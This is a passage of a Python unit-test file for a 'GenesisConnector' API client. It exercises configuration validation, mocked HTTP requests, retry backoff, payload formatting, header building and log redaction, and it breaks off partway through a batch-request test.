import pytest
import unittest
from unittest.mock import Mock, patch, MagicMock, call
import asyncio
import json
from datetime import datetime, timedelta
import logging
from typing import Dict, List, Optional, Any

# Import the module under test
try:
    from app.ai_backend.genesis_connector import GenesisConnector
except ImportError:
    from ai_backend.genesis_connector import GenesisConnector


class TestGenesisConnector(unittest.TestCase):
    """
    Comprehensive unit tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):

        """
        Initializes a new GenesisConnector instance and a mock configuration before each test case.
        """
        self.connector = GenesisConnector()
        self.mock_config = {
            'api_key': 'test_api_key',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'retry_count': 3
        }
        
    def tearDown(self):

        """
        Performs cleanup after each test method. Override to reset state or release resources if necessary.
        """
        # Reset any global state if needed
        pass

    def test_init_default_parameters(self):

        """
        Test that a GenesisConnector instance initializes successfully with default parameters.
        """
        connector = GenesisConnector()
        self.assertIsNotNone(connector)
        self.assertIsInstance(connector, GenesisConnector)

    def test_init_with_config(self):

        """
        Test initialization of GenesisConnector with a custom configuration.
        
        Verifies that the connector instance is created and its configuration matches the provided custom config.
        """
        connector = GenesisConnector(config=self.mock_config)
        self.assertIsNotNone(connector)
        self.assertEqual(connector.config, self.mock_config)

    def test_init_with_none_config(self):

        """
        Test initializing GenesisConnector with None as the configuration.
        
        Verifies that passing None for the config parameter does not raise an exception and produces a valid GenesisConnector instance.
        """
        connector = GenesisConnector(config=None)
        self.assertIsNotNone(connector)

    def test_init_with_empty_config(self):
        """Test GenesisConnector initialization with empty config."""
        connector = GenesisConnector(config={})
        self.assertIsNotNone(connector)

    def test_init_with_invalid_config_type(self):
        """Test GenesisConnector initialization with invalid config type."""
        with self.assertRaises(TypeError):
            GenesisConnector(config="invalid_string_config")

    def test_init_with_config_containing_non_string_keys(self):
        """Test GenesisConnector initialization with config containing non-string keys."""
        invalid_config = {123: 'value', 'valid_key': 'value'}
        with self.assertRaises(ValueError):
            GenesisConnector(config=invalid_config)

    @patch('requests.get')
    def test_connect_success(self, mock_get):

        """
        Test that `connect()` returns True when the Genesis API responds with HTTP 200 and valid JSON.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertTrue(result)
        mock_get.assert_called_once()

    @patch('requests.get')
    def test_connect_failure_404(self, mock_get):

        """
        Test that connect() returns False when the server responds with HTTP 404 Not Found.
        """
        mock_response = Mock()
        mock_response.status_code = 404
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_failure_timeout(self, mock_get):
        """Test connection failure with timeout."""
        mock_get.side_effect = TimeoutError("Connection timeout")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_failure_connection_error(self, mock_get):

        """
        Verify that connect() returns False when a connection error is raised during the connection attempt.
        """
        mock_get.side_effect = ConnectionError("Connection failed")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_ssl_verification_disabled(self, mock_get):
        """Test connection with SSL verification disabled."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        connector = GenesisConnector(config={'verify_ssl': False})
        result = connector.connect()
        
        self.assertTrue(result)
        # Verify SSL verification was disabled
        mock_get.assert_called_with(verify=False, allow_redirects=True)

    @patch('requests.get')
    def test_connect_with_custom_user_agent(self, mock_get):
        """Test connection with custom User-Agent header."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        custom_config = {
            'user_agent': 'GenesisConnector/1.0 (Custom Agent)',
            'base_url': 'https://api.test.com'
        }
        connector = GenesisConnector(config=custom_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Check that custom User-Agent was used
        call_args = mock_get.call_args
        self.assertIn('User-Agent', call_args[1]['headers'])

    @patch('requests.get')
    def test_connect_with_proxy_configuration(self, mock_get):
        """Test connection with proxy configuration."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        proxy_config = {
            'base_url': 'https://api.test.com',
            'proxies': {'http': 'http://proxy.test.com:8080'}
        }
        connector = GenesisConnector(config=proxy_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Verify proxy was used
        call_args = mock_get.call_args
        self.assertIn('proxies', call_args[1])

    @patch('requests.get')
    def test_connect_with_authentication_headers(self, mock_get):
        """Test connection with custom authentication headers."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_response
        
        auth_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'auth_type': 'bearer'
        }
        connector = GenesisConnector(config=auth_config)
        result = connector.connect()
        
        self.assertTrue(result)
        # Check authentication header
        call_args = mock_get.call_args
        headers = call_args[1]['headers']
        self.assertIn('Authorization', headers)

    @patch('requests.get')
    def test_connect_with_multiple_failure_codes(self, mock_get):
        """Test connection failure with various HTTP status codes."""
        failure_codes = [400, 401, 403, 404, 500, 502, 503, 504]
        
        for code in failure_codes:
            with self.subTest(status_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_get.return_value = mock_response
                
                result = self.connector.connect()
                self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_redirect_handling(self, mock_get):
        """Test connection with redirect handling."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'connected'}
        mock_response.history = [Mock(status_code=301)]
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        self.assertTrue(result)
        # Verify redirects were followed
        mock_get.assert_called_with(allow_redirects=True)

    @patch('requests.post')
    def test_send_request_success(self, mock_post):

        """
        Test that send_request returns the expected response dictionary when a POST request with a valid payload is successful.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'test_response'}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        result = self.connector.send_request(payload)
        
        self.assertEqual(result, {'data': 'test_response'})
        mock_post.assert_called_once()

    @patch('requests.post')
    def test_send_request_invalid_payload(self, mock_post):

        """
        Test that sending a request with a `None` payload raises a `ValueError`.
        """
        with self.assertRaises(ValueError):
            self.connector.send_request(None)

    @patch('requests.post')
    def test_send_request_empty_payload(self, mock_post):
        """Test sending request with empty payload."""
        with self.assertRaises(ValueError):
            self.connector.send_request({})

    @patch('requests.post')
    def test_send_request_server_error(self, mock_post):

        """
        Test that send_request raises a RuntimeError when the server responds with a 500 Internal Server Error.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.text = 'Internal Server Error'
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request(payload)

    @patch('requests.post')
    def test_send_request_malformed_json(self, mock_post):

        """
        Verifies that send_request raises a ValueError when the server returns a response with malformed JSON.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_post.return_value = mock_response
        
        payload = {'message': 'test_message'}
        
        with self.assertRaises(ValueError):
            self.connector.send_request(payload)

    @patch('requests.post')
    def test_send_request_with_different_http_methods(self, mock_post):
        """Test sending requests with different HTTP methods."""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        
        for method in methods:
            with self.subTest(method=method):
                with patch(f'requests.{method.lower()}') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'method': method}
                    mock_request.return_value = mock_response
                    
                    payload = {'message': 'test', 'method': method}
                    result = self.connector.send_request(payload, method=method)
                    
                    self.assertEqual(result['method'], method)

    @patch('requests.post')
    def test_send_request_with_file_upload(self, mock_post):
        """Test sending request with file upload."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'uploaded': True}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        files = {'file': ('test.txt', 'file content', 'text/plain')}
        result = self.connector.send_request(payload, files=files)
        
        self.assertEqual(result['uploaded'], True)
        # Verify files were included in the request
        call_args = mock_post.call_args
        self.assertIn('files', call_args[1])

    @patch('requests.post')
    def test_send_request_with_streaming_response(self, mock_post):
        """Test sending request with streaming response."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.iter_content.return_value = [b'chunk1', b'chunk2']
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        result = self.connector.send_request(payload, stream=True)
        
        self.assertIsNotNone(result)

    @patch('requests.post')
    def test_send_request_with_custom_timeout(self, mock_post):
        """Test sending request with custom timeout."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'timeout_test': True}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        result = self.connector.send_request(payload, timeout=60)
        
        self.assertEqual(result['timeout_test'], True)
        # Verify timeout was set
        call_args = mock_post.call_args
        self.assertEqual(call_args[1]['timeout'], 60)

    @patch('requests.post')
    def test_send_request_with_request_id_tracking(self, mock_post):
        """Test sending request with request ID tracking."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'request_id': '12345'}
        mock_post.return_value = mock_response
        
        payload = {'message': 'test', 'request_id': '12345'}
        result = self.connector.send_request(payload)
        
        self.assertEqual(result['request_id'], '12345')

    def test_validate_config_valid(self):

        """
        Verify that `validate_config` returns True for a valid configuration dictionary.
        """
        valid_config = {
            'api_key': 'valid_key',
            'base_url': 'https://valid.url',
            'timeout': 30
        }
        
        result = self.connector.validate_config(valid_config)
        
        self.assertTrue(result)

    def test_validate_config_missing_api_key(self):

        """
        Verify that `validate_config` raises a `ValueError` when the configuration does not include an API key.
        """
        invalid_config = {
            'base_url': 'https://valid.url',
            'timeout': 30
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_invalid_url(self):

        """
        Verify that `validate_config` raises a `ValueError` when the configuration contains an invalid base URL.
        """
        invalid_config = {
            'api_key': 'valid_key',
            'base_url': 'invalid_url',
            'timeout': 30
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_negative_timeout(self):

        """
        Test that `validate_config` raises a `ValueError` when the configuration specifies a negative timeout value.
        """
        invalid_config = {
            'api_key': 'valid_key',
            'base_url': 'https://valid.url',
            'timeout': -1
        }
        
        with self.assertRaises(ValueError):
            self.connector.validate_config(invalid_config)

    def test_validate_config_none_input(self):
        """Test configuration validation with None input."""
        with self.assertRaises(ValueError):
            self.connector.validate_config(None)

    def test_validate_config_with_extreme_values(self):
        """Test configuration validation with extreme values."""
        extreme_configs = [
            {'api_key': 'k', 'base_url': 'https://a.b', 'timeout': 0.1},  # Minimum values
            {'api_key': 'x' * 1000, 'base_url': 'https://very-long-domain-name.com', 'timeout': 3600},  # Large values
            {'api_key': '', 'base_url': 'https://test.com', 'timeout': 30},  # Empty API key
            {'api_key': 'test', 'base_url': 'ftp://invalid.scheme', 'timeout': 30},  # Invalid scheme
        ]
        
        for i, config in enumerate(extreme_configs):
            with self.subTest(config_index=i):
                if i < 2:  # First two should pass
                    result = self.connector.validate_config(config)
                    self.assertTrue(result)
                else:  # Last two should fail
                    with self.assertRaises(ValueError):
                        self.connector.validate_config(config)

    def test_validate_config_with_additional_fields(self):
        """Test configuration validation with additional optional fields."""
        extended_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': 30,
            'retry_count': 5,
            'retry_delay': 2,
            'user_agent': 'CustomAgent/1.0',
            'max_connections': 10,
            'verify_ssl': True,
            'proxies': {'http': 'http://proxy.test.com:8080'}
        }
        
        result = self.connector.validate_config(extended_config)
        self.assertTrue(result)

    @patch('requests.get')
    def test_get_status_healthy(self, mock_get):

        """
        Verify that `get_status` returns a dictionary with status 'healthy' and the correct version when the service responds with HTTP 200 and a healthy status payload.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'status': 'healthy', 'version': '1.0.0'}
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'healthy')
        self.assertEqual(status['version'], '1.0.0')

    @patch('requests.get')
    def test_get_status_unhealthy(self, mock_get):
        """Test getting status when service is unhealthy."""
        mock_response = Mock()
        mock_response.status_code = 503
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'unhealthy')

    @patch('requests.get')
    def test_get_status_with_detailed_response(self, mock_get):
        """Test getting detailed status information."""
        detailed_status = {
            'status': 'healthy',
            'version': '2.1.0',
            'uptime': 86400,
            'connections': 42,
            'memory_usage': '256MB',
            'last_restart': '2024-01-15T10:30:00Z'
        }
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = detailed_status
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'healthy')
        self.assertEqual(status['version'], '2.1.0')
        self.assertEqual(status['uptime'], 86400)
        self.assertEqual(status['connections'], 42)

    @patch('requests.get')
    def test_get_status_with_partial_service_degradation(self, mock_get):
        """Test getting status when service is partially degraded."""
        degraded_status = {
            'status': 'degraded',
            'issues': ['high_latency', 'connection_pool_exhausted'],
            'affected_endpoints': ['/api/v1/heavy-operation']
        }
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = degraded_status
        mock_get.return_value = mock_response
        
        status = self.connector.get_status()
        
        self.assertEqual(status['status'], 'degraded')
        self.assertIn('issues', status)
        self.assertIn('affected_endpoints', status)

    def test_format_payload_valid_data(self):
        """Test payload formatting with valid data."""
        data = {
            'message': 'test',
            'timestamp': datetime.now().isoformat(),
            'metadata': {'key': 'value'}
        }
        
        formatted = self.connector.format_payload(data)
        
        self.assertIn('message', formatted)
        self.assertIn('timestamp', formatted)
        self.assertIn('metadata', formatted)

    def test_format_payload_with_special_characters(self):

        """
        Tests that the payload formatting method correctly handles data with special characters and Unicode, ensuring all expected keys are present in the formatted result.
        """
        data = {
            'message': 'test with üñíçødé',
            'special': '!@#$%^&*()',
            'quotes': 'text with "quotes" and \'apostrophes\''
        }
        
        formatted = self.connector.format_payload(data)
        
        self.assertIn('message', formatted)
        self.assertIn('special', formatted)
        self.assertIn('quotes', formatted)

    def test_format_payload_empty_data(self):

        """
        Test that calling format_payload with an empty dictionary raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.format_payload({})

    def test_format_payload_none_data(self):
        """Test payload formatting with None data."""
        with self.assertRaises(ValueError):
            self.connector.format_payload(None)

    def test_format_payload_with_nested_structures(self):
        """Test payload formatting with deeply nested data structures."""
        nested_data = {
            'level1': {
                'level2': {
                    'level3': {
                        'level4': {
                            'deep_value': 'found',
                            'array': [1, 2, {'nested_in_array': True}]
                        }
                    }
                }
            },
            'timestamp': datetime.now().isoformat()
        }
        
        formatted = self.connector.format_payload(nested_data)
        
        self.assertIn('level1', formatted)
        self.assertIn('timestamp', formatted)

    def test_format_payload_with_circular_references(self):
        """Test payload formatting with circular references."""
        data = {'key': 'value'}
        data['self'] = data  # Create circular reference
        
        # Should handle circular references gracefully
        with self.assertRaises(ValueError):
            self.connector.format_payload(data)

    def test_format_payload_with_binary_data(self):
        """Test payload formatting with binary data."""
        binary_data = {
            'message': 'test',
            'binary_field': b'binary_content',
            'image_data': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
        }
        
        formatted = self.connector.format_payload(binary_data)
        
        self.assertIn('message', formatted)
        # Binary data should be handled appropriately (encoded/converted)

    def test_format_payload_with_datetime_objects(self):
        """Test payload formatting with various datetime objects."""
        from datetime import datetime, date, time
        
        datetime_data = {
            'datetime_field': datetime.now(),
            'date_field': date.today(),
            'time_field': time(14, 30, 0),
            'timestamp': datetime.now().timestamp()
        }
        
        formatted = self.connector.format_payload(datetime_data)
        
        # All datetime objects should be properly serialized
        self.assertIn('datetime_field', formatted)
        self.assertIn('date_field', formatted)
        self.assertIn('time_field', formatted)

    @patch('requests.post')
    def test_retry_mechanism_success_after_retry(self, mock_post):

        """
        Verifies that `send_request_with_retry` retries after an initial failure and returns the correct response upon a subsequent success.
        
        Simulates a failed POST request followed by a successful one, ensuring the method returns the expected data and performs the correct number of retries.
        """
        # First call fails, second succeeds
        mock_response_fail = Mock()
        mock_response_fail.status_code = 500
        mock_response_success = Mock()
        mock_response_success.status_code = 200
        mock_response_success.json.return_value = {'data': 'success'}
        
        mock_post.side_effect = [mock_response_fail, mock_response_success]
        
        payload = {'message': 'test'}
        result = self.connector.send_request_with_retry(payload)
        
        self.assertEqual(result, {'data': 'success'})
        self.assertEqual(mock_post.call_count, 2)

    @patch('requests.post')
    def test_retry_mechanism_max_retries_exceeded(self, mock_post):

        """
        Test that a RuntimeError is raised when all retry attempts for a failed request are exhausted.
        
        Verifies that the request is attempted the expected number of times and that each attempt results in a server error.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=3)
        
        self.assertEqual(mock_post.call_count, 4)  # Initial + 3 retries

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_backoff_timing(self, mock_post, mock_sleep):

        """
        Verifies that the retry mechanism applies incrementally increasing backoff delays between retries after consecutive server errors.
        
        Simulates repeated server errors and asserts that the sleep function is called with delays that increase according to the backoff strategy.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=2)
        
        # Check that sleep was called with increasing delays
        expected_calls = [call(1), call(2)]
        mock_sleep.assert_has_calls(expected_calls)

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_with_exponential_backoff(self, mock_post, mock_sleep):
        """Test retry mechanism with exponential backoff strategy."""
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request_with_retry(payload, max_retries=4, backoff_strategy='exponential')
        
        # Check exponential backoff timing: 1, 2, 4, 8
        expected_calls = [call(1), call(2), call(4), call(8)]
        mock_sleep.assert_has_calls(expected_calls)

    @patch('time.sleep')
    @patch('requests.post')
    def test_retry_mechanism_with_jitter(self, mock_post, mock_sleep):
        """Test retry mechanism with jitter to avoid thundering herd."""
        with patch('random.uniform') as mock_random:
            mock_random.return_value = 0.5  # Fixed jitter value
            mock_response = Mock()
            mock_response.status_code = 500
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            with self.assertRaises(RuntimeError):
                self.connector.send_request_with_retry(payload, max_retries=2, use_jitter=True)
            
            # Sleep should be called with jitter applied
            mock_sleep.assert_called()
            mock_random.assert_called()

    @patch('requests.post')
    def test_retry_mechanism_with_specific_retry_codes(self, mock_post):
        """Test retry mechanism only retries on specific HTTP status codes."""
        retry_codes = [500, 502, 503, 504]
        no_retry_codes = [400, 401, 403, 404, 422]
        
        for code in retry_codes:
            with self.subTest(retry_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_post.return_value = mock_response
                
                payload = {'message': 'test'}
                
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Should have retried
                self.assertGreater(mock_post.call_count, 1)
        
        for code in no_retry_codes:
            with self.subTest(no_retry_code=code):
                mock_response = Mock()
                mock_response.status_code = code
                mock_post.return_value = mock_response
                
                payload = {'message': 'test'}
                
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Should NOT have retried
                self.assertEqual(mock_post.call_count, 1)

    def test_parse_response_valid_json(self):
        """Test parsing valid JSON response."""
        response_data = {'key': 'value', 'number': 123, 'bool': True}
        json_string = json.dumps(response_data)
        
        parsed = self.connector.parse_response(json_string)
        
        self.assertEqual(parsed, response_data)

    def test_parse_response_invalid_json(self):

        """
        Test that `parse_response` raises a ValueError when given an invalid JSON string.
        """
        invalid_json = '{"invalid": json}'
        
        with self.assertRaises(ValueError):
            self.connector.parse_response(invalid_json)

    def test_parse_response_empty_string(self):
        """Test parsing empty string response."""
        with self.assertRaises(ValueError):
            self.connector.parse_response('')

    def test_parse_response_none_input(self):

        """
        Test that passing None to parse_response raises a ValueError.
        """
        with self.assertRaises(ValueError):
            self.connector.parse_response(None)

    def test_parse_response_with_different_content_types(self):
        """Test parsing responses with different content types."""
        test_cases = [
            ('application/json', '{"key": "value"}'),
            ('text/plain', 'plain text response'),
            ('application/xml', '<root><key>value</key></root>'),
            ('text/html', '<html><body>response</body></html>')
        ]
        
        for content_type, content in test_cases:
            with self.subTest(content_type=content_type):
                mock_response = Mock()
                mock_response.headers = {'Content-Type': content_type}
                mock_response.text = content
                
                if content_type == 'application/json':
                    mock_response.json.return_value = {"key": "value"}
                    parsed = self.connector.parse_response(mock_response)
                    self.assertEqual(parsed, {"key": "value"})
                else:
                    parsed = self.connector.parse_response(mock_response)
                    self.assertEqual(parsed, content)

    def test_parse_response_with_encoding_issues(self):
        """Test parsing responses with different character encodings."""
        test_encodings = ['utf-8', 'latin-1', 'ascii']
        
        for encoding in test_encodings:
            with self.subTest(encoding=encoding):
                mock_response = Mock()
                mock_response.encoding = encoding
                mock_response.text = 'test with special chars: café'
                
                parsed = self.connector.parse_response(mock_response)
                self.assertIsNotNone(parsed)

    def test_log_request_valid_data(self):

        """
        Test that the log_request method logs the payload when provided with valid data.
        """
        with patch('logging.info') as mock_log:
            payload = {'message': 'test'}
            self.connector.log_request(payload)
            
            mock_log.assert_called()

    def test_log_request_sensitive_data_redaction(self):

        """
        Verify that sensitive fields such as 'api_key' and 'password' are redacted from log output when logging a request payload.
        """
        with patch('logging.info') as mock_log:
            payload = {
                'message': 'test',
                'api_key': 'sensitive_key',
                'password': 'secret_password'
            }
            self.connector.log_request(payload)
            
            # Check that sensitive data was redacted
            logged_message = mock_log.call_args[0][0]
            self.assertNotIn('sensitive_key', logged_message)
            self.assertNotIn('secret_password', logged_message)

    def test_log_request_with_performance_metrics(self):
        """Test logging request with performance metrics."""
        with patch('logging.info') as mock_log, \
             patch('time.time') as mock_time:
            
            mock_time.side_effect = [1000.0, 1000.5]  # 0.5 second duration
            
            payload = {'message': 'test'}
            self.connector.log_request(payload, include_timing=True)
            
            # Check that timing information was logged
            mock_log.assert_called()
            logged_message = mock_log.call_args[0][0]
            self.assertIn('duration', logged_message.lower())

    def test_log_request_with_structured_logging(self):
        """Test logging request with structured logging format."""
        with patch('logging.info') as mock_log:
            payload = {
                'message': 'test',
                'user_id': 'user123',
                'session_id': 'session456'
            }
            
            self.connector.log_request(payload, structured=True)
            
            # Check that structured format was used
            mock_log.assert_called()
            logged_data = mock_log.call_args[0][0]
            self.assertIn('user_id', logged_data)
            self.assertIn('session_id', logged_data)

    def test_get_headers_with_auth(self):

        """
        Tests that `get_headers` returns headers containing both `Authorization` and `Content-Type` when an API key is present in the configuration.
        """
        connector = GenesisConnector(config={'api_key': 'test_key'})
        headers = connector.get_headers()
        
        self.assertIn('Authorization', headers)
        self.assertIn('Content-Type', headers)

    def test_get_headers_without_auth(self):

        """
        Verify that `get_headers` omits the `Authorization` header when no authentication is configured, but includes the `Content-Type` header.
        """
        connector = GenesisConnector(config={})
        headers = connector.get_headers()
        
        self.assertNotIn('Authorization', headers)
        self.assertIn('Content-Type', headers)

    def test_get_headers_with_custom_headers(self):
        """Test getting headers with custom headers merged."""
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'custom_headers': {
                'X-Custom-Header': 'custom_value',
                'X-Client-Version': '1.0.0'
            }
        })
        
        headers = connector.get_headers()
        
        self.assertIn('Authorization', headers)
        self.assertIn('X-Custom-Header', headers)
        self.assertIn('X-Client-Version', headers)
        self.assertEqual(headers['X-Custom-Header'], 'custom_value')

    def test_get_headers_with_conditional_headers(self):
        """Test getting headers with conditional headers based on request type."""
        connector = GenesisConnector(config={'api_key': 'test_key'})
        
        # Test headers for different request types
        json_headers = connector.get_headers(request_type='json')
        self.assertEqual(json_headers['Content-Type'], 'application/json')
        
        form_headers = connector.get_headers(request_type='form')
        self.assertEqual(form_headers['Content-Type'], 'application/x-www-form-urlencoded')
        
        multipart_headers = connector.get_headers(request_type='multipart')
        self.assertIn('multipart/form-data', multipart_headers['Content-Type'])

    def test_close_connection(self):

        """
        Verify that calling the connector's `close` method completes without raising exceptions.
        """
        # This test depends on the actual implementation
        result = self.connector.close()
        
        # Should not raise an exception
        self.assertTrue(True)

    def test_context_manager_usage(self):
        """
        Verify that GenesisConnector can be used as a context manager without raising errors.
        """
        with GenesisConnector(config=self.mock_config) as connector:
            self.assertIsNotNone(connector)
            # Context manager should work without errors

    def test_thread_safety(self):

        """
        Verifies that configuration validation in GenesisConnector is thread-safe by running multiple concurrent validations and ensuring all succeed.
        """
        import threading
        results = []
        
        def worker():

            """
            Validates the connector configuration in a separate thread and appends the result to a shared results list.
            """
            connector = GenesisConnector(config=self.mock_config)
            results.append(connector.validate_config(self.mock_config))
        
        threads = [threading.Thread(target=worker) for _ in range(5)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        # All workers should complete successfully
        self.assertEqual(len(results), 5)
        self.assertTrue(all(results))

    def test_large_payload_handling(self):

        """
        Test that the connector can format and handle large payloads without raising memory-related errors.
        """
        large_payload = {
            'message': 'x' * 10000,  # 10KB string
            'data': list(range(1000))  # Large list
        }
        
        # Should format without raising memory errors
        formatted = self.connector.format_payload(large_payload)
        self.assertIsNotNone(formatted)

    def test_concurrent_requests(self):

        """
        Verifies that the connector can handle multiple concurrent requests, ensuring all complete successfully without errors.
        """
        import concurrent.futures
        
        def make_request():
            with patch('requests.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'data': 'test'}
                mock_post.return_value = mock_response
                
                return self.connector.send_request({'message': 'test'})
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(make_request) for _ in range(5)]
            results = [future.result() for future in futures]
        
        # All requests should complete successfully
        self.assertEqual(len(results), 5)

    def test_error_handling_chain(self):

        """
        Tests that an exception is raised and properly propagated when a network error occurs during a chained `send_request` call.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = Exception("Network error")
            
            payload = {'message': 'test'}
            
            with self.assertRaises(Exception):
                self.connector.send_request(payload)

    def test_configuration_reload(self):
        """Test reloading configuration."""
        new_config = {
            'api_key': 'new_key',
            'base_url': 'https://new.url',
            'timeout': 60
        }
        
        self.connector.reload_config(new_config)
        
        # Configuration should be updated
        self.assertEqual(self.connector.config, new_config)

    def test_metrics_collection(self):

        """
        Verifies that sending a request through the connector records both 'requests_sent' and 'response_time' metrics.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'data': 'test'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            self.connector.send_request(payload)
            
            # Check that metrics were collected
            metrics = self.connector.get_metrics()
            self.assertIn('requests_sent', metrics)
            self.assertIn('response_time', metrics)

    def test_health_check_endpoint(self):

        """
        Test that the health check endpoint returns a status of 'healthy' when the service responds with HTTP 200 and valid JSON.
        """
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'status': 'healthy'}
            mock_get.return_value = mock_response
            
            health = self.connector.health_check()
            
            self.assertEqual(health['status'], 'healthy')

    def test_rate_limiting_handling(self):

        """
        Tests that a RuntimeError is raised when an HTTP 429 response with a Retry-After header is received, indicating the connector correctly handles rate limiting.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 429
            mock_response.headers = {'Retry-After': '1'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            with self.assertRaises(RuntimeError):
                self.connector.send_request(payload)

    def test_connection_pooling_behavior(self):
        """Test connection pooling and reuse behavior."""
        with patch('requests.Session') as mock_session:
            mock_session_instance = Mock()
            mock_session.return_value = mock_session_instance
            
            connector = GenesisConnector(config={'use_session': True})
            
            # Make multiple requests
            for i in range(3):
                with patch.object(mock_session_instance, 'post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'request': i}
                    mock_post.return_value = mock_response
                    
                    payload = {'message': f'test{i}'}
                    connector.send_request(payload)
            
            # Session should be reused
            mock_session.assert_called_once()

    def test_async_request_handling(self):
        """Test asynchronous request handling if supported."""
        async def async_test():
            with patch('aiohttp.ClientSession') as mock_session:
                mock_session_instance = Mock()
                mock_session.return_value.__aenter__.return_value = mock_session_instance
                
                mock_response = Mock()
                mock_response.status = 200
                mock_response.json = Mock(return_value={'async': True})
                mock_session_instance.post.return_value.__aenter__.return_value = mock_response
                
                connector = GenesisConnector(config={'async_mode': True})
                payload = {'message': 'async_test'}
                
                try:
                    result = await connector.send_request_async(payload)
                    self.assertEqual(result['async'], True)
                except AttributeError:
                    # Skip test if async methods not implemented
                    pass
        
        # Run async test if event loop is available
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(async_test())
        except RuntimeError:
            # Skip if no event loop
            pass

    def test_batch_request_processing(self):
        """Test processing multiple requests in batch."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'batch': True}
            mock_post.return_value = mock_response
            
            payloads = [
                {'message': 'batch1'},
                {'message': 'batch2'},
                {'message': 'batch3'}
            ]
            
            try:
                results = self.connector.send_batch_requests(payloads)
                self.assertEqual(len(results), 3)
